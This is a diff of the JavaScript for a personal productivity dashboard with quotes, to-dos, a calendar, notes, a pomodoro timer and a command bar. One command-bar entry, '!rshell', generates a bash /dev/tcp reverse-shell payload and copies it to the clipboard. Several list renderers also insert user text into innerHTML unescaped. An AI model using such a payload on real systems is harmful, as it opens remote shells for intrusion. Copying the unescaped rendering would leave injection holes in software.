+      return { q: pool[Math.floor(Math.random() * pool.length)], theme };
+    }
+
+    function displayQuote(theme) {
+      const { q, theme: resolved } = pickQuote(theme);
+      currentQuoteTheme = resolved;
+      localStorage.setItem('dash-quote-theme', resolved);
+      document.getElementById('quote-text').textContent   = q.t;
+      document.getElementById('quote-author').textContent = '— ' + q.a;
+      document.getElementById('quote-theme').textContent  = THEME_LABELS[resolved];
+    }
+
+    displayQuote(currentQuoteTheme);
+
+    // Clic sur le bandeau → nouvelle citation du même thème
+    document.getElementById('quote-strip').addEventListener('click', () => displayQuote(currentQuoteTheme));
+
+    // ════════════════════════════════════════════════════════
+    //  TO-DO
+    // ════════════════════════════════════════════════════════
+    let todos = JSON.parse(localStorage.getItem('dash-todos')||'[]');
+
+    function renderTodos() {
+      const list     = document.getElementById('todo-list');
+      const empty    = document.getElementById('todo-empty');
+      const clearBtn = document.getElementById('todo-clear-btn');
+      const progRow  = document.getElementById('todo-progress-row');
+      const progBar  = document.getElementById('todo-progress-bar');
+      const progTxt  = document.getElementById('todo-progress-text');
+      list.innerHTML = '';
+      const total = todos.length, done = todos.filter(t=>t.done).length;
+      empty.style.display    = total===0?'block':'none';
+      clearBtn.style.display = todos.some(t=>t.done)?'block':'none';
+      progRow.style.display  = total>0?'flex':'none';
+      progBar.style.width    = total>0?(done/total*100)+'%':'0%';
+      progTxt.textContent    = done+'/'+total;
+      todos.forEach((t,i) => {
+        const li = document.createElement('li');
+        li.className = 'todo-item'+(t.done?' done':'');
+        li.innerHTML =
+          `<label class="todo-check-wrap"><input type="checkbox" data-i="${i}"${t.done?' checked':''}><span class="todo-circle"></span></label>`+
+          `<span class="todo-text">${t.text}</span>`+
+          `<button class="del-todo" data-i="${i}">×</button>`;
+        list.appendChild(li);
+      });
+    }
+    function saveTodos() { localStorage.setItem('dash-todos',JSON.stringify(todos)); }
+    function addTodo(text) {
+      if (!text) return;
+      todos.unshift({text,done:false});
+      saveTodos();
+      renderTodos();
+    }
+    document.getElementById('add-todo-btn').addEventListener('click', () => {
+      const inp = document.getElementById('todo-input'), val = inp.value.trim();
+      if (val) { addTodo(val); inp.value=''; }
+    });
+    document.getElementById('todo-input').addEventListener('keypress', e => {
+      if (e.key==='Enter') document.getElementById('add-todo-btn').click();
+    });
+    document.getElementById('todo-list').addEventListener('change', e => {
+      if (e.target.type==='checkbox') { todos[+e.target.dataset.i].done=e.target.checked; saveTodos(); renderTodos(); }
+    });
+    document.getElementById('todo-list').addEventListener('click', e => {
+      if (e.target.classList.contains('del-todo')) { todos.splice(+e.target.dataset.i,1); saveTodos(); renderTodos(); }
+    });
+    document.getElementById('todo-clear-btn').addEventListener('click', () => {
+      todos=todos.filter(t=>!t.done); saveTodos(); renderTodos();
+    });
+    renderTodos();
+
+    // ════════════════════════════════════════════════════════
+    //  CALENDRIER
+    // ════════════════════════════════════════════════════════
+    let calYear=new Date().getFullYear(), calMonth=new Date().getMonth(), selectedDay=null;
+    let calEvents=JSON.parse(localStorage.getItem('dash-events')||'{}');
+
+    function saveCalEvents() { localStorage.setItem('dash-events',JSON.stringify(calEvents)); }
+    function renderCalendar() {
+      const grid=document.getElementById('cal-grid');
+      const today=new Date();
+      const firstDay=new Date(calYear,calMonth,1).getDay();
+      const offset=firstDay===0?6:firstDay-1;
+      const daysInMonth=new Date(calYear,calMonth+1,0).getDate();
+      document.getElementById('cal-month-label').textContent=MONTHS[calMonth]+' '+calYear;
+      grid.innerHTML='';
+      for (let i=0;i<offset;i++) { const e=document.createElement('div'); e.className='cal-cell cal-empty'; grid.appendChild(e); }
+      for (let d=1;d<=daysInMonth;d++) {
+        const dateStr=`${calYear}-${String(calMonth+1).padStart(2,'0')}-${String(d).padStart(2,'0')}`;
+        const cell=document.createElement('div');
+        const dow=(offset+d-1)%7;
+        const isToday=calYear===today.getFullYear()&&calMonth===today.getMonth()&&d===today.getDate();
+        const isSel=selectedDay===dateStr;
+        cell.className='cal-cell';
+        if (isToday) cell.classList.add('cal-today');
+        if (isSel)   cell.classList.add('cal-selected');
+        if (dow>=5&&!isToday&&!isSel) cell.classList.add('cal-weekend');
+        let html=`<span class="cal-day-num">${d}</span>`;
+        const evts=calEvents[dateStr];
+        if (evts&&evts.length>0) {
+          html+='<div class="cal-dots">';
+          for (let i=0;i<Math.min(evts.length,3);i++) html+='<div class="cal-dot"></div>';
+          html+='</div>';
+        }
+        cell.innerHTML=html;
+        cell.addEventListener('click',()=>selectDay(dateStr));
+        grid.appendChild(cell);
+      }
+    }
+    function selectDay(dateStr) { selectedDay=dateStr; renderCalendar(); showDayPanel(dateStr); }
+    function closePanel() { selectedDay=null; document.getElementById('cal-day-panel').style.display='none'; renderCalendar(); }
+    function showDayPanel(dateStr) {
+      document.getElementById('cal-day-panel').style.display='block';
+      const [y,m,d]=dateStr.split('-');
+      const dateObj=new Date(+y,+m-1,+d);
+      document.getElementById('cal-day-title').textContent=DAYS[dateObj.getDay()]+' '+(+d)+' '+MONTHS[+m-1]+' '+y;
+      renderEventsList(dateStr);
+      const now=new Date(); const h=(now.getHours()+1)%24;
+      document.getElementById('cal-time-input').value=String(h).padStart(2,'0')+':00';
+      document.getElementById('cal-event-input').value='';
+    }
+    function renderEventsList(dateStr) {
+      const list=document.getElementById('cal-events-list');
+      list.innerHTML='';
+      const evts=(calEvents[dateStr]||[]).slice().sort((a,b)=>a.time.localeCompare(b.time));
+      if (evts.length===0) { list.innerHTML='<li class="cal-no-events">// aucun événement</li>'; return; }
+      evts.forEach((ev,i) => {
+        const li=document.createElement('li');
+        li.className='cal-event-item';
+        li.innerHTML=`<span class="ev-time">${ev.time}</span><span class="ev-title">${ev.title}</span><button class="del-ev" data-i="${i}" data-date="${dateStr}">×</button>`;
+        list.appendChild(li);
+      });
+    }
+    document.getElementById('cal-prev').addEventListener('click',()=>{ calMonth--; if(calMonth<0){calMonth=11;calYear--;} closePanel(); });
+    document.getElementById('cal-next').addEventListener('click',()=>{ calMonth++; if(calMonth>11){calMonth=0;calYear++;} closePanel(); });
+    document.getElementById('cal-today-btn').addEventListener('click',()=>{ const t=new Date(); calYear=t.getFullYear(); calMonth=t.getMonth(); closePanel(); });
+    document.getElementById('cal-close-btn').addEventListener('click',closePanel);
+    document.getElementById('cal-add-btn').addEventListener('click',()=>{
+      if (!selectedDay) return;
+      const time=document.getElementById('cal-time-input').value||'00:00';
+      const title=document.getElementById('cal-event-input').value.trim();
+      if (!title) return;
+      if (!calEvents[selectedDay]) calEvents[selectedDay]=[];
+      calEvents[selectedDay].push({time,title}); saveCalEvents();
+      document.getElementById('cal-event-input').value='';
+      renderEventsList(selectedDay); renderCalendar();
+    });
+    document.getElementById('cal-event-input').addEventListener('keypress',e=>{ if(e.key==='Enter') document.getElementById('cal-add-btn').click(); });
+    document.getElementById('cal-events-list').addEventListener('click',e=>{
+      if (!e.target.classList.contains('del-ev')) return;
+      const i=parseInt(e.target.dataset.i), dateStr=e.target.dataset.date;
+      const sorted=(calEvents[dateStr]||[]).slice().sort((a,b)=>a.time.localeCompare(b.time));
+      const target=sorted[i];
+      const orig=calEvents[dateStr];
+      const idx=orig.findIndex(ev=>ev.time===target.time&&ev.title===target.title);
+      if (idx!==-1) orig.splice(idx,1);
+      if (orig.length===0) delete calEvents[dateStr];
+      saveCalEvents(); renderEventsList(selectedDay); renderCalendar();
+    });
+    renderCalendar();
+
+    // ════════════════════════════════════════════════════════
+    //  NOTES
+    // ════════════════════════════════════════════════════════
+    let notes=JSON.parse(localStorage.getItem('dash-notes')||'[]');
+    function renderNotes() {
+      const list=document.getElementById('note-list'), empty=document.getElementById('note-empty');
+      list.innerHTML=''; empty.style.display=notes.length===0?'block':'none';
+      notes.forEach((n,i)=>{
+        const li=document.createElement('li');
+        li.className='note-item'+(n.done?' done':'');
+        li.innerHTML=`<input type="checkbox" data-i="${i}"${n.done?' checked':''}><span>${n.text}</span><button class="del-note" data-i="${i}">×</button>`;
+        list.appendChild(li);
+      });
+    }
+    function saveNotes() { localStorage.setItem('dash-notes',JSON.stringify(notes)); }
+    document.getElementById('add-note-btn').addEventListener('click',()=>{
+      const inp=document.getElementById('note-input'), val=inp.value.trim();
+      if (val) { notes.unshift({text:val,done:false}); inp.value=''; saveNotes(); renderNotes(); }
+    });
+    document.getElementById('note-input').addEventListener('keypress',e=>{ if(e.key==='Enter') document.getElementById('add-note-btn').click(); });
+    document.getElementById('note-list').addEventListener('click',e=>{
+      if (e.target.type==='checkbox') { notes[+e.target.dataset.i].done=e.target.checked; saveNotes(); renderNotes(); }
+      if (e.target.classList.contains('del-note')) { notes.splice(+e.target.dataset.i,1); saveNotes(); renderNotes(); }
+    });
+    renderNotes();
+
+    // ════════════════════════════════════════════════════════
+    //  POMODORO
+    // ════════════════════════════════════════════════════════
+    const FOCUS_TIME=25*60, BREAK_TIME=5*60, CIRC=2*Math.PI*50;
+    const RING=document.getElementById('ring-progress');
+    RING.style.strokeDasharray=CIRC;
+    let pomSecs=FOCUS_TIME, pomRunning=false, pomInterval=null, pomMode='focus', pomSession=1;
+    function updateRing() {
+      const total=pomMode==='focus'?FOCUS_TIME:BREAK_TIME;
+      RING.style.strokeDashoffset=CIRC*(1-pomSecs/total);
+    }
+    function updateTimerDisplay() {
+      document.getElementById('timer-display').textContent=String(Math.floor(pomSecs/60)).padStart(2,'0')+':'+String(pomSecs%60).padStart(2,'0');
+      updateRing();
+    }
+    function switchMode() {
+      if (pomMode==='focus') { pomMode='break'; pomSecs=BREAK_TIME; document.getElementById('timer-mode').textContent='// pause'; }
+      else { pomMode='focus'; pomSecs=FOCUS_TIME; pomSession++; document.getElementById('timer-mode').textContent='// focus'; document.getElementById('timer-count').textContent='session_'+pomSession; }
+      updateTimerDisplay();
+    }
+    document.getElementById('timer-start').addEventListener('click',()=>{
+      if (pomRunning) return; pomRunning=true;
+      pomInterval=setInterval(()=>{ pomSecs--; updateTimerDisplay(); if(pomSecs<=0){clearInterval(pomInterval);pomRunning=false;switchMode();} },1000);
+    });
+    document.getElementById('timer-pause').addEventListener('click',()=>{ clearInterval(pomInterval); pomRunning=false; });
+    document.getElementById('timer-reset').addEventListener('click',()=>{
+      clearInterval(pomInterval); pomRunning=false; pomMode='focus'; pomSecs=FOCUS_TIME;
+      document.getElementById('timer-mode').textContent='// focus'; updateTimerDisplay();
+    });
+    updateTimerDisplay();
+
+    // ════════════════════════════════════════════════════════
+    //  CLI — barre de commandes
+    // ════════════════════════════════════════════════════════
+    let toastTimer=null;
+    function showToast(msg, isError=false, duration=2500) {
+      const el=document.getElementById('cli-toast');
+      el.textContent=msg;
+      el.classList.toggle('error',isError);
+      el.classList.add('show');
+      clearTimeout(toastTimer);
+      toastTimer=setTimeout(()=>el.classList.remove('show'),duration);
+    }
+
+    const b64e = s => btoa(unescape(encodeURIComponent(s)));
+    const b64d = s => { try { return decodeURIComponent(escape(atob(s))); } catch { return null; } };
+
+    async function cliDispatch(raw) {
+      const input=raw.trim();
+      if (!input) return;
+
+      // !gh <query>
+      if (/^!gh\s+/i.test(input)) {
+        window.open('https://github.com/search?q='+encodeURIComponent(input.slice(4).trim()),'_blank'); return;
+      }
+      // !cve <id>
+      if (/^!cve\s+/i.test(input)) {
+        const raw_id=input.slice(5).trim();
+        const id=/^cve-/i.test(raw_id)?raw_id.toUpperCase():'CVE-'+raw_id;
+        window.open('https://nvd.nist.gov/vuln/detail/'+id,'_blank'); return;
+      }
+      // !b64e <text>
+      if (/^!b64e\s+/i.test(input)) {
+        const result=b64e(input.slice(6).trim());
+        document.getElementById('search-input').value=result;
+        await navigator.clipboard.writeText(result);
+        showToast('✓ base64 encoded — copié'); return;
+      }
+      // !b64d <text>
+      if (/^!b64d\s+/i.test(input)) {
+        const result=b64d(input.slice(6).trim());
+        if (result===null) { showToast('✗ base64 invalide',true); return; }
+        document.getElementById('search-input').value=result;
+        await navigator.clipboard.writeText(result);
+        showToast('✓ base64 decoded — copié'); return;
+      }
+      // !rshell <ip> <port>
+      if (/^!rshell\s+/i.test(input)) {
+        const parts=input.slice(8).trim().split(/\s+/);
+        if (parts.length<2) { showToast('✗ usage: !rshell <ip> <port>',true); return; }
+        const payload=`bash -i >& /dev/tcp/${parts[0]}/${parts[1]} 0>&1`;
+        document.getElementById('search-input').value=payload;
+        await navigator.clipboard.writeText(payload);
+        showToast('✓ payload copié'); return;
+      }
+      // quote <theme> — changer le thème de citation
+      if (/^quote(\s+\S+)?$/i.test(input)) {
+        const arg = input.slice(6).trim().toLowerCase();
+        if (!arg || arg === 'random') { displayQuote('random'); showToast('✓ citation aléatoire'); return; }
+        const resolved = THEME_ALIASES[arg] || (QUOTE_DB[arg] ? arg : null);
+        if (!resolved) { showToast('✗ thèmes: cyber · stoic · tech · motivation · random', true); return; }
+        displayQuote(resolved);
+        showToast('✓ thème: ' + resolved);
+        return;
+      }
+
+      // todo add <text>
+      if (/^todo\s+add\s+/i.test(input)) {
+        const text=input.slice(9).trim();
+        if (text) { addTodo(text); document.getElementById('search-input').value=''; showToast('✓ tâche ajoutée: '+text); }
+        return;
+      }
+      // Default: DuckDuckGo
+      window.open('https://duckduckgo.com/?q='+encodeURIComponent(input),'_blank');
+    }
+
+    document.getElementById('search-btn').addEventListener('click',()=>{
+      const val=document.getElementById('search-input').value.trim();
+      if (val) cliDispatch(val);
+    });
+    document.getElementById('search-input').addEventListener('keydown',e=>{
+      if (e.key==='Enter') { e.preventDefault(); const val=e.target.value.trim(); if(val) cliDispatch(val); }
+      if (e.key==='Escape') { e.target.value=''; e.target.blur(); }
+    });
+
+    // ════════════════════════════════════════════════════════
+    //  HEALTHCHECKS — pastilles dynamiques
+    // ════════════════════════════════════════════════════════
+    async function isReachable(url) {
+      const ctrl=new AbortController();
+      const tid=setTimeout(()=>ctrl.abort(),2500);
+      try { await fetch(url,{mode:'no-cors',signal:ctrl.signal}); clearTimeout(tid); return true; }
+      catch { clearTimeout(tid); return false; }
+    }
+    function setDotState(dot, state) { dot.classList.remove('up','down','checking'); dot.classList.add(state); }
+    async function checkAllServers() {
+      document.querySelectorAll('.server-link').forEach(async link => {
+        const dot=link.querySelector('.server-dot');
+        if (!dot) return;
+        const origin=new URL(link.href).origin;
+        setDotState(dot,'checking');
+        setDotState(dot, await isReachable(origin) ? 'up' : 'down');
+      });
+    }
+    checkAllServers();
+    setInterval(checkAllServers, 30000);
+
+    // ════════════════════════════════════════════════════════
+    //  KEYBOARD — raccourcis globaux
+    // ════════════════════════════════════════════════════════
+    function isTypingContext() {
+      const el=document.activeElement;
+      return el && (el.tagName==='INPUT'||el.tagName==='TEXTAREA'||el.isContentEditable);
+    }
+    document.addEventListener('keydown', e => {
+      // Ctrl/Cmd + L — privacy mode
+      if ((e.ctrlKey||e.metaKey) && e.key==='l') {
+        e.preventDefault();
+        document.body.classList.toggle('locked');
+        return;
+      }
+      if (isTypingContext()) return;
+      if (e.key==='/') { e.preventDefault(); const inp=document.getElementById('search-input'); inp.focus(); inp.select(); }
+      if (e.key==='j') { e.preventDefault(); window.scrollBy({top:160,behavior:'smooth'}); }
+      if (e.key==='k') { e.preventDefault(); window.scrollBy({top:-160,behavior:'smooth'}); }
+    });
+  </script>
+</body>
+</html>
+                                            
